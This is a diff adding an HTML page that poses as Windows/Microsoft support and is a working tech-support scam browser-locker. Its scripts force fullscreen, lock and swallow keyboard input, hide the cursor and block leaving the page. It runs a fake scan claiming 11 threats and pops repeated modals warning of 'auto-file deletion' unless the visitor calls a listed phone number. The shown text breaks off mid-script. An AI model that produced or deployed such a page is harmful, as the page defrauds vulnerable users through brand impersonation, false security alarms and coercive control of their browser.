@@ -1,0 +1,1579 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Updated meta tags for Microsoft branding -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Windows-Support assistance</title>
+  <link rel="icon" type="image/png" href="images/mainimg.png">
+  
+  <!-- Added Bootstrap 5 and external libraries -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  <!-- Embedded all CSS from styles.css, custom.css, and additional styles -->
+  <style>
+    body {
+      background: #fff;
+      -webkit-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      font-family: 'Google Sans', 'Google Sans Text', Roboto, sans-serif;
+      background-image: url("images/back.jpg");
+      background-size: cover;
+      background-repeat: no-repeat;
+      width: 100%;
+      height: 100vh;
+      cursor: none !important;
+      overflow: hidden;
+      color: #fff;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    .top {
+      padding-left: 10px;
+    }
+    
+    .progress {
+      width: 250px;
+      background: #d1d1d1;
+      height: 04px;
+    }
+
+    .progress .progress__bar {
+      height: 100%;
+      width: 0%;
+      border-radius: 2px;
+      background-color: #3182be;
+      animation: fill-bar 6s 1;
+    }
+
+    @keyframes fill-bar {
+      from {width: 0%;}
+      to {width: 100%;}
+    }
+    
+    .textc {
+      color: grey;
+      font-size: 13px;
+    }
+    
+    .flex {
+      display: flex;
+    }
+    
+    .button {
+      background: #cccccc;
+      color: #000;
+      padding: 6px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 13px;
+      margin: 4px 2px;
+      cursor: pointer;
+      font-weight:350;
+    }
+
+    .centerright img {
+      max-width: 100%;
+    }
+    
+    .centerright ul {
+      padding: 0;
+      list-style-type: none;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+    }
+    
+    .centerright li {
+      width: calc((100vw / 3) - 20px);
+      display: inline-block;
+    }
+
+    .centerright {
+      position: absolute;
+      left: 70px;
+      top: 150px;
+      display: flex;
+    }
+    
+    .btn:hover {
+      cursor:pointer;
+    }
+    
+    .box {
+      display: none;
+      position: absolute;
+      width: 723px;
+      height: 560px;
+      top: 49%;
+      z-index: 999;
+      margin-top: -255px;
+      left: 48%;
+      border-radius: 0px;
+      margin-left: -325px;
+      border-radius: 8px;
+      padding-right: 10px;
+      padding-left: 0px;
+      background: #fff;
+      box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+    }
+    
+    .scan {
+      display: none;
+      position: absolute;
+      width: 723px;
+      height: 569px;
+      top: 49%;
+      z-index: 999;
+      margin-top: -255px;
+      left: 48%;
+      border-radius: 0px;
+      margin-left: -325px;
+      border-radius: 8px;
+      padding-right: 10px;
+      padding-left: 0px;
+      background: #fff;
+      box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
+    }
+    
+    .scan::-webkit-scrollbar {
+      display: none;
+    }
+
+    .alert_popup{
+      position: absolute;
+      top: 4%;
+      z-index: 9999;
+      left: 33.5%;
+      background: #1a73e8;
+      width: 440px;
+      text-align: left;
+      color: #fff;
+      padding-top: 4px;
+      display: none;
+      margin: 20px;
+      transform: translate(-50%, -50%);
+      padding: 0 10px;
+    }
+    
+    .alert_popup p{
+      font-size: 13px;
+      padding-bottom: 10px;
+      margin: 10px;
+      line-height: 18px;
+    }
+    
+    .action_buttons a.active {
+      border: 1px solid #3B79ED;
+      font-weight: bold;
+    }
+    
+    .action_buttons a {
+      float: right;
+      font-size: 12px;
+      margin-right: 15px;
+      padding: 6px 25px;
+      text-decoration: none;
+      color: #fff !important;
+      border: 1px solid #fff;
+      margin-top: 20px;
+      border-radius: 3px;
+      margin-bottom: 20px;
+    }
+    
+    .cardcontainer {
+      animation: zoominoutsinglefeatured 4s infinite ;
+      border-radius: 10px;
+    }
+    
+    @keyframes zoominoutsinglefeatured {
+      0% { transform: scale(1,1); }
+      50% { transform: scale(1.1,1.1); }
+      100% { transform: scale(1,1); }
+    }
+
+    #chat-box{
+      background-color: #fff;
+      padding: 15px;
+      position: fixed;
+      bottom: 21px;
+      right: 13px;
+      z-index: 99999999;
+      border-radius: 10px;
+      display: none;
+    }
+    
+    #chat-box img{
+      color: #000;
+      font-size: 16px;
+      font-weight: 600;
+      margin-left: 35px;
+      width: 25px;
+    }
+    
+    #chat-box h4{
+      width: 217px;
+      font-size: 20px;
+      color: #000;
+      text-align: center;
+      padding-top: 7px;
+      margin: 0px auto;
+      display: block;
+    }
+    
+    #chat-box a{
+      text-align: center;
+      color: #fff;
+      margin: 0px auto;
+      display: block;
+    }
+    
+    #chat-box p {
+      font-size: 16px;
+      text-align: center;
+      color: #fff;
+      padding-top: 7px;
+      font-weight: normal;
+    }
+    
+    #chat-box .arrow-down{
+      position: absolute;
+      font-size: 47px;
+      color: #fff;
+      bottom: -39px;
+      left: 65px;
+    }
+
+    .greyside {
+      padding: 10px;
+      border-top-right-radius: 10px;
+      border-top-left-radius: 10px;
+      background:#e7e7e7;
+    }
+    
+    .bottomselect {
+      padding: 10px;
+      border-bottom-right-radius: 10px;
+      border-bottom-left-radius: 10px;
+      background:#e7e7e7;
+    }
+    
+    .lst{
+      font-weight: 700;
+      padding: 15px 30px;
+      min-height: 285px;
+      border-radius: 10px;
+      border: 1px solid #fff;
+      width: 560px;
+      margin: 0 auto;
+      background-color: #000000;
+      box-shadow: rgb(0 0 0 / 25%) 0px 54px 55px, rgb(0 0 0 / 12%) 0px -12px 30px, rgb(0 0 0 / 12%) 0px 4px 6px, rgb(0 0 0 / 17%) 0px 12px 13px, rgb(0 0 0 / 9%) 0px -3px 5px;
+      z-index: 99999;
+      position: absolute;
+      top: 50%;
+      left: 51%;
+      cursor: pointer;
+      transform: translate(-50%, -50%);
+      display: none;
+    }
+    
+    .ilb {
+      display: inline-block;
+    }
+    
+    .headers {
+      width: 535px;
+      margin-top: 7px;
+      padding-bottom: 15px;
+    }
+    
+    .logo3 {
+      margin: 0 7px -6px 0;
+      width: 25px;
+      height: 25px;
+    }
+    
+    .title2 img {
+      position: absolute;
+      color:#fff;
+      width: 3%;
+      top: 17px;
+      right: 17px;
+    }
+    
+    #txtintro {
+      clear: both;
+      padding-top: 5px;
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
+    }
+    
+    .colo-rd {
+      color: #ff0000;
+    }
+    
+    #banner {
+      margin: 5px auto;
+      display: block;
+      width: 280px;
+    }
+    
+    #disclaimer {
+      margin: 5px;
+      font-size: 17px;
+      color: #fff;
+      font-weight: bold;
+      text-align: center;
+    }
+    
+    .support {
+      font-weight: bold;
+      font-size: 17px;
+      color: #1a73e8;
+    }
+    
+    #bottom {
+      margin: 12px 0;
+      height: 50px;
+      display: flex;
+      border-top: 1px solid #d6d5d5;
+    }
+    
+    #badge{
+      height: 25px;
+      margin-top: 18px;
+      width: 25px;
+    }
+    
+    .title3 {
+      font-size: 18px;
+      color: #fff;
+      font-weight: 700;
+      text-transform: capitalize;
+      position: relative;
+      width: 36%;
+      top: 21px;
+      left: 13px;
+    }
+    
+    #bottom ul {
+      list-style-type: none;
+      margin-left: 18px;
+      margin-top: 6px;
+    }
+    
+    #bottom ul li {
+      display: inline-block;
+      float: left;
+      padding-left: 20px;
+      margin-top: 13px;
+    }
+    
+    .button2 {
+      border-radius: 4px;
+      padding: 10px 30px 10px 30px;
+      color: #fff;
+      border: 1px solid #e94339;
+      background-color: #e94339;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      cursor: pointer;
+    }
+    
+    .buttons {
+      border-radius: 4px;
+      padding: 10px 30px 10px 30px;
+      color: #fff;
+      background-color: #1a73e8;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      cursor: pointer;
+    }
+    
+    a {
+      color: #007bff;
+      text-decoration: none;
+      background-color: transparent;
+    }
+    
+    a:hover {
+      color: #0056b3;
+      text-decoration: underline;
+    }
+    
+    .button2:hover {
+      color: #fff;
+    }
+    
+    .blink {
+      animation: blink-animation 1s steps(5, start) infinite;
+      -webkit-animation: blink-animation 1s steps(5, start) infinite;
+    }
+    
+    .blink2 {
+      animation: blink-animation 1s steps(5, start) infinite;
+      -webkit-animation: blink-animation 1s steps(5, start) infinite;
+    }
+
+    @keyframes blink-animation {
+      to { visibility: hidden; }
+    }
+    
+    @-webkit-keyframes blink-animation {
+      to { visibility: hidden; }
+    }
+
+    #footer {
+      width: 100%;
+      position: fixed;
+      bottom: 0;
+      background-color: #1a73e8;
+      z-index: 999;
+      padding: 10px 34px;
+      color: #fff;
+      font-size: 18px;
+      height: 46px;
+      cursor: pointer;
+      left: 0;
+    }
+    
+    #footertxt, #footertxt2 {
+      font-size: 20px;
+    }
+    
+    #footertxt img {
+      width: 23px;
+      vertical-align: text-top;
+    }
+    
+    :host {
+      display: inline-block;
+      overflow: hidden;
+      text-align: initial;
+      white-space: nowrap;
+    }
+    
+    .bg .bgimg {
+      position: absolute;
+      top: 60px;
+      left: 0px;
+      width: 100%;
+    }
+    
+    .black {
+      width: 100%;
+      height: 100%;
+      background-color: rgb(0 0 0 / 47%);
+      opacity: 0.7;
+      transition: 1s;
+      position: absolute;
+      top: -190px;
+      left:0
+    }
+    
+    .colo-rd .blink{
+      font-size: 18px;
+      display: inline-block;
+      margin-bottom: 5px;
+    }
+    
+    .logo12{
+      width: 22px;
+      display: inline-block;
+      vertical-align: middle;
+      max-width: 100%;
+      margin-right: 5px;
+      margin-top: -2px;
+    }
+    
+    ul.icon-links {
+      margin: 0px 0 20px 0;
+      padding: 0 0 0 15px;
+      list-style: none;
+    }
+    
+    ul.icon-links li {
+      color: #fff;
+      font-size: 13px;
+      margin: 0;
+      font-weight: 400;
+      line-height: 20px;
+      transition: all .6s ease 0s;
+    }
+    
+    ul.icon-links li img{
+      width: 18px;
+      vertical-align: middle;
+      padding-right: 5px;
+    }
+
+    .cross{
+      position:absolute;
+      top:2px;
+      right:10px;
+      font-weight:bolder;
+      color:#888;
+      text-decoration:none
+    }
+    
+    a:focus{
+      outline:0;
+      border:0
+    }
+    
+    .chrome-alert{
+      position:fixed;
+      top:-10px;
+      left:0;
+      right:0;
+      z-index: 999999;
+    }
+    
+    .chrome-alert>div{
+      margin:0 auto;
+      width:440px;
+      background:#FBFBFB;
+      border:1px solid #BABABA;
+      border-radius:3px;
+      box-shadow:0 2px 0 rgba(0,0,0,.3);
+      position:relative;
+      padding: 0px 15px;
+    }
+    
+    .chrome-alert h1{
+      font-size:15px;
+      font-weight:400;
+      margin:0 0 5px;
+      padding:5px 10px;
+      color:#414141
+    }
+    
+    .chrome-alert p{
+      font-size:12px;
+      padding:0 10px;
+      color:#414141;
+      margin: 12px 0;
+      padding: 0;
+    }
+    
+    .chrome-alert .action_buttons{
+      overflow:auto
+    }
+    
+    .chrome-alert .action_buttons a{
+      float:right;
+      font-size:12px;
+      margin-right:15px;
+      padding: 8px 25px;
+      text-decoration:none;
+      margin-top: 5px;
+      border-radius:2px;
+      margin-bottom: 10px;
+      margin-right: 5px;
+      border: 1px solid #3B79ED;
+      color: #3B79ED !important;
+    }
+    
+    .chrome-alert .action_buttons a.active{
+      background: #3B79ED;
+      border:1px solid #3B79ED;
+      font-weight:600;
+      color: #fff !important;
+    }
+    
+    .chrome-alert .content-box{
+      max-height:440px;
+      overflow:auto;
+      margin:0 20px
+    }
+    
+    .chrome-alert .content-box p{
+      padding:0;
+      margin-left:0
+    }
+    
+    .chrome-alert label{
+      padding: 0px;
+      font-size:12px;
+      color: #000;
+      vertical-align: text-top;
+    }
+    
+    .chrome-alert label:hover{
+      color:#3B79ED
+    }
+    
+    .chrome-alert label:focus{
+      color:#3B79ED;
+      outline:dotted
+    }
+
+    #welcomeDiv{
+      background-color: rgb(0, 0, 0);
+      height: auto;
+      width: 550px;
+      margin-left: 31%;
+      position: absolute;
+      z-index: 2147483647;
+      text-align: center;
+      margin-top: -8px;
+      padding: 14px 35px;
+      line-height: 23px;
+      display:none;
+      top: 0;
+    }
+
+    /* Additional custom styles */
+    .blue-box{
+      width: 40%;
+      height: 300px;
+      cursor: none !important; 
+      display: block;
+      position: absolute;
+      top: 6%;
+      z-index: 999999;
+      left: 36%;
+      background: #1a73e8;
+      width: 440px;
+      text-align: left;
+      padding-top: 4px;
+      color: #FFFFFF;
+      padding-left: 20px;
+      padding-right: 20px;
+      animation: zoominoutsinglefeatured 4s infinite;
+      height: 600px;
+      font-size: 13px;
+      border-radius: 8px;
+    }
+    
+    .blue-box .heading{
+      font-size: 16px;
+      font-weight: normal;
+      margin: 0;
+      margin-bottom: 5px;
+      padding: 5px 10px;
+      color: #FFFFFF !important;
+      color: #414141;
+      font-weight: bold;
+      margin-top: 8px;
+    }
+
+    .accept-box{
+      font-weight: 700;
+      padding: 15px 30px;
+      min-height: 300px;
+      border-radius: 10px;
+      border: 1px solid #fff;
+      width: 620px;
+      display: block;
+      margin: 0 auto;
+      background-color: #000000;
+      z-index: 9999999;
+      box-shadow: 5px 5px 15px 5px rgba(0, 0, 0, 0.4);
+      position: absolute;
+      top: 27%;
+      left: 30%;
+      cursor: pointer;
+    }
+
+    .accept-box .textIntro{
+      clear: both;
+      padding-top: 0px;
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .accept-box .headers{
+      width: 535px;
+      margin-top: 7px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid #d6d5d5;
+    }
+
+    .accept-box .close{
+      float: right;
+      font-size: 1.5rem;
+      font-weight: 700;
+      line-height: 1;
+      color: #6e0606;
+      text-shadow: 0 1px 0 #fff;
+      opacity: .5;
+    }
+
+    .close img{
+      position: absolute;
+      width: 3%;
+      top: 27px;
+      right: 17px;
+    }
+
+    .alert-banner{
+      margin: 5px auto;
+      display: block;
+    }
+
+    .text-details{
+      margin: 5px;
+      font-size: 17px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .mynum{
+      font-weight: bold;
+      font-size: 17px;
+      color: #1a73e8;
+    }
+
+    .bottom-details{
+      margin: 12px 0;
+      height: 50px;
+      display: flex;
+      border-top: 1px solid #d6d5d5;
+    }
+
+    .bottom-details .bg{
+      margin-top: 22px;
+      height: 27px;
+    }
+
+    .bottom-details ul{
+      list-style-type: none;
+      margin-left: 190px;
+    }
+
+    .bottom-details ul li{
+      display: inline-block;
+      float: left;
+      padding-left: 20px;
+      margin-top: 13px;
+    }
+
+    .bottom-details ul li a{
+      text-decoration: none;
+    }
+
+    .ms-title{
+      font-size: 18px;
+      font-weight: 700;
+      text-transform: capitalize;
+      position: relative;
+      width: 3%;
+      top: 21px;
+      left: 8px;
+    }
+
+    .cancel-button{
+      border-radius: 4px;
+      padding: 10px 30px 10px 30px;
+      color: #000;
+      border: 1px solid #000;
+      background-color: transparent;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .scan-now{
+      border-radius: 4px;
+      padding: 10px 30px 10px 30px;
+      color: #fff;
+      background-color: #1a73e8;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .page-footer{
+      width: 100%;
+      position: fixed;
+      bottom: 0;
+      background-color: #1a73e8;
+      z-index: 999;
+      padding: 10px 34px;
+      color: #fff;
+      font-size: 18px;
+      height: 81px;
+      cursor: pointer;
+      position: absolute;
+      cursor: none;
+    }
+
+    .text-font{
+      font-size: 20px;
+    }
+
+    .text-font img{
+      width: 20px;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+    }
+
+    header {
+      width: 100%;
+      padding: 10px;
+      background: #0b1726;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 60px auto;
+      padding: 20px;
+      background-image: url("images/back.jpg");
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(24, 119, 242, 0.3);
+    }
+
+    h2 {
+      color: #1877f2;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+
+    p {
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+
+    .error-box {
+      background-image: url("images/back.jpg");
+      padding: 15px;
+      border-left: 5px solid #1877f2;
+      border-radius: 5px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      background: #1877f2;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #0f5fcc;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      margin-top: 40px;
+      color: #aaa;
+      font-size: 14px;
+    }
+
+    @media (max-width: 480px) {
+      .container { margin: 40px 10px; }
+      h2 { font-size: 20px; }
+    }
+
+    .modal-body .alert-text {
+      margin-bottom: 15px;
+    }
+
+    .callnowbtn {
+      margin-bottom: 10px;
+    }
+
+    .modal-dialog.positioned {
+      max-width: 400px;
+      margin: 0;
+      position: absolute;
+    }
+
+    .modal-content {
+      height: auto;
+      padding: 15px;
+      border-radius: 10px;
+      background: #13233a;
+      color: #fff;
+    }
+
+    .modal-body img {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 15px;
+    }
+
+    .alert-text {
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+    .callnowbtn button {
+      width: 100%;
+      font-size: 14px;
+    }
+
+    .actionbtn button {
+      font-size: 14px;
+      padding: 6px 12px;
+    }
+
+    .blink_me {
+      animation: blinker 1s linear infinite;
+    }
+
+    @keyframes blinker {
+      50% { opacity: 0; }
+    }
+
+    .blink1 {
+      background-color:green;
+      animation: blink-animation 1s steps(5, start) infinite;
+      -webkit-animation: blink-animation 1s steps(5, start) infinite;
+    }
+  </style>
+
+  <!-- Embedded all JavaScript functionality -->
+  <script>
+    var elem = document.documentElement;
+    function openFullscreen() {
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
+      }
+    }
+
+    function closeFullscreen() {
+      if (document.exitFullscreen) {
+        document.exitFullscreen();
+      } else if (document.webkitExitFullscreen) {
+        document.webkitExitFullscreen();
+      } else if (document.msExitFullscreen) {
+        document.msExitFullscreen();
+      }
+    }
+  </script>
+
+  <script type="text/javascript">
+    function getPhone(name) {
+      name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+      var regexS = "[\\?&]"+name+"=([^&#]*)";
+      var regex = new RegExp( regexS );
+      var results = regex.exec( window.location.href );
+      if( results == null )
+        return "";
+      else
+        return results[1];
+    }
+  </script>
+
+  <script type="text/javascript">
+    var phone = getPhone('phone');
+  </script>
+
+  <script type="text/javascript">
+    window.onload = function(){
+      document.onclick = function(e){
+        e = e || event;
+        target = e.target || e.srcElement;
+        if(target.tagName === 'DIV') {
+          toggleFullScreen();
+          document.body.style.cursor = 'not-allowed';
+          document.getElementById('stroka').innerHTML = stroka;
+          document.getElementById('fa').innerHTML = '<iframe src=\'#\' width=\'12\' height=\'12\' style=\'position: absolute; left: -25px;\'></iframe>';
+        } else {
+          toggleFullScreen();
+          document.body.style.cursor = 'not-allowed';
+          document.getElementById('stroka').innerHTML = stroka;
+          document.getElementById('fa').innerHTML = '<iframe src=\'#\' width=\'12\' height=\'12\' style=\'position: absolute; left: -25px;\'></iframe>';
+        }
+      };
+    };
+  </script>
+
+  <script>
+    addEventListener("click", function() {
+      var el = document.documentElement, 
+          rfs = el.requestFullScreen || el.webkitRequestFullScreen || el.mozRequestFullScreen;
+      rfs.call(el);
+    });
+  </script>
+
+  <script type="text/javascript">
+    document.addEventListener('keyup', function (e) {
+      var key = e.keyCode || e.which;
+      if (key === 122 || key === 17 || key === 18 || key === 13) {
+        var mapEl = document.getElementById('map');
+        if (mapEl) mapEl.innerHTML = (typeof stroka !== 'undefined') ? stroka : '';
+        if (typeof toggleFullScreen === 'function') toggleFullScreen();
+      }
+    }, false);
+  </script>
+
+  <script type="text/javascript">
+    document.addEventListener('keyup', function (e) {
+      if(e.keyCode === 27) {
+        toggleFullScreen();
+      }
+    }, false);
+  </script>
+
+  <script type="text/javascript">
+    window.onbeforeunload = function(){
+      if(data_needs_saving()){
+        return 'Do you really want to leave our brilliant application?';
+      } else {
+        return;
+      }
+    };
+  </script>
+
+  <script>
+    navigator.userAgentData.getHighEntropyValues(['platformVersion']).then(ua => {
+      if (navigator.userAgentData.platform === 'Windows') {
+        const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+        if (majorPlatformVersion >= 13) {
+          document.getElementById("which").innerHTML = " 11";
+        } else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        } else {
+          console.log("Beyond");
+        }
+      } else {
+        console.log("does not work on Windows");
+      }
+    });
+  </script>
+
+  <script>
+    var counter = 60;
+    var interval = setInterval(function(){
+      counter--;
+      if(counter <= 0){
+        clearInterval(interval);
+        $('#timer').html('If you think you have used Licenced Windows Activation Code, click DENY button to claim the Code.');
+        return;
+      } else {
+        $('#time').text(counter);
+        console.log('Timer --> ' + counter);
+      }
+    }, 1000);
+  </script>
+
+  <script type="text/javascript">
+    window.addEventListener("beforeunload", function (e) {
+      var confirmationMessage = 'Windows Support - Call Helpline Now';
+      (e || window.event).returnValue = confirmationMessage;
+      return confirmationMessage;
+    });
+  </script>
+
+  <script>
+    navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+      return false;
+    }
+  </script>
+
+  <!-- Embedded scripts.js functionality -->
+  <script type="text/javascript">
+    setTimeout(function () {
+      document.getElementById("box").style.display = "block";
+    }, 800);
+    
+    setTimeout(function () {
+      startScan();
+    }, 1000);
+
+    function startScan() {
+      document.getElementById("box").style.display = "none";
+      document.getElementById("scan").style.display = "block";
+
+      setTimeout(function () { document.getElementById("amount").innerHTML = "34"; }, 200);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "256"; }, 210);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "312"; }, 220);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "349"; }, 230);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "460"; }, 240);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "498"; }, 250);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "685"; }, 250);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "702"; }, 260);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "702"; }, 270);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "749"; }, 280);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "776"; }, 290);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "897"; }, 300);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "937"; }, 310);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "993"; }, 320);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1056"; }, 330);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1056"; }, 340);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1240"; }, 350);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1349"; }, 400);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1416"; }, 500);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1512"; }, 600);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1636"; }, 700);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1685"; }, 800);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1732"; }, 900);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1798"; }, 1000);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "1999"; }, 1100);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "2038"; }, 1200);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "2229"; }, 1300);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "2415"; }, 1400);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "2510"; }, 900);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "2566"; }, 1300);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3012"; }, 1300);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3049"; }, 1300);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3230"; }, 1400);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3450"; }, 1100);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3515"; }, 1200);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3600"; }, 1500);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3629"; }, 1000);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3749"; }, 1100);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3818"; }, 1200);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3819"; }, 1300);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3820"; }, 1400);
+      setTimeout(function () { document.getElementById("amount").innerHTML = "3821"; }, 1500);
+
+      // time countdown
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:30"; }, 300);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:25"; }, 400);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:17"; }, 500);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:45"; }, 600);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:06"; }, 700);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:03"; }, 800);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:01"; }, 900);
+      setTimeout(function () { document.getElementById("time").innerHTML = "0:00:00"; }, 1000);
+
+      setTimeout(function () {
+        document.getElementById("info").innerHTML = "Threat detected. <br> Last scan: " + date_time + "<br> 11 threats found. <br> Scan lasted 0 minutes, 6 seconds. <br> 3821 scanned file. "
+      }, 1000);
+      setTimeout(function () { document.getElementById("bar").style.display = "none"; }, 1000);
+      setTimeout(function () { document.getElementById("re").innerHTML = "quick scan"; }, 1000);
+      setTimeout(function () { document.getElementById("recx").style.display = "none"; }, 1000);
+      setTimeout(function () { document.getElementById("recx-hide").style.display = "none"; }, 1000);
+      setTimeout(function () { document.getElementById("shx").style.display = "block"; }, 1000);
+
+      $(".alert_popup").delay(1000).fadeIn(500);
+      $(".websa").delay(1500).fadeIn(500);
+    } 
+
+    function playSound() {
+      document.getElementById("beep").play();
+    }
+
+    var date = new Date();
+    var current_date = date.getFullYear()+"-"+(date.getMonth()+1)+"-"+ date.getDate();
+    var current_time = date.getHours()+":"+date.getMinutes();
+    var date_time = current_date+" "+current_time;	
+    if(document.getElementById("p1")) {
+      document.getElementById("p1").innerHTML = date_time;
+    }
+  </script>
+
+  <script>
+    $(document).ready(function() {
+      $("#chat-box").delay(6000).fadeIn(100);
+    });
+  </script>
+
+  <script>
+    $(document).ready(function() {
+      $("#mycanvas").click(function(){
+        $("#welcomeDiv").show();
+      });
+    });
+  </script>
+
+  <script>
+    let modalCount = 0;
+
+    function triggerFullScreen() {
+      const elem = document.documentElement;
+      if (!document.fullscreenElement) {
+        if (elem.requestFullscreen) { elem.requestFullscreen().catch(()=>{}); }
+      }
+    }
+
+    function exitFullScreen() {
+      if (document.exitFullscreen) { document.exitFullscreen(); }
+    }
+
+    function getRandomPosition(modalWidth, modalHeight) {
+      const vw = window.innerWidth;
+      const vh = window.innerHeight;
+      const maxX = vw - modalWidth;
+      const maxY = vh - modalHeight;
+      return { top: Math.random() * maxY, left: Math.random() * maxX };
+    }
+
+    function createNewModal() {
+      modalCount++;
+      const newModal = document.createElement('div');
+      newModal.className = 'modal fade modal-stack';
+      newModal.id = `fbAlertModal-${modalCount}`;
+      newModal.tabIndex = -1;
+      newModal.innerHTML = `
+        <div class="modal-dialog positioned">
+          <div class="modal-content">
+            <div class="modal-header pb-0">
+              <button type="button" class="p-0 btn-close"></button>
+            </div>
+            <div class="modal-body text-center">
+              <img src="images/mainimg.png" alt="Microsoft Windows" class="mx-auto">
+              <div class="alert-text">
+                "Microsoft Servers have detected usage of this machine across different locations as displayed above. Auto-file deletion may start if not contacted the Windows Representative in". For immediate assistance and account protection, contact Microsoft Support at  
+                <a href="tel:+1 8333916501" class="text-white underline">+1-833-391-6501</a>.
+              </div>
+
+              <div class="callnowbtn">
+                <a href="tel:+1 8333916501" class="tel-link">
+                  <button type="button" class="btn btn-primary text-white">Call Now</button>
+                </a>
+              </div>
+
+              <div class="text-center mt-4 actionbtn">
+                <button type="button" class="btn btn-primary ok-btn me-2">OK</button>
+                <button type="button" class="btn btn-outline-secondary cancel-btn">Cancel</button>
+              </div>
+            </div>
+          </div>
+        </div>`;
+      document.body.appendChild(newModal);
+      const modal = new bootstrap.Modal(newModal, {backdrop:'static', keyboard:false});
+      const dlg = newModal.querySelector('.modal-dialog');
